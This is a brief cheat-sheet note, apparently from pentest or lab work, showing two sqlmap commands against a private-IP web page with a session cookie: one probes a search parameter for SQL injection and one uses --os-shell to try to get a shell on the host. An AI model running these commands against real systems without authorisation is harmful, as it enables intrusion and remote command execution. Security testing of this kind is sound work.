# SQL Map

Use sqlmap to test a URL parameter for SQLi vulnerability

```bash
# note that here we're providing a cookie too, reqd for auth in this case
sqlmap -u 'http://10.123.32.1/dashboard.php?search=dummyparam' --cookie="PHPSESSID=cbu4s4g076c6hvgn9tq2jn8a4t"
```

Use sqlmap to try and pop a shell on the host

```bash
sqlmap -u 'http://10.123.32.1/dashboard.php?search=dummyparam' --cookie="PHPSESSID=cbu4s4g076c6hvgn9tq2jn8a4t" --os-shell
```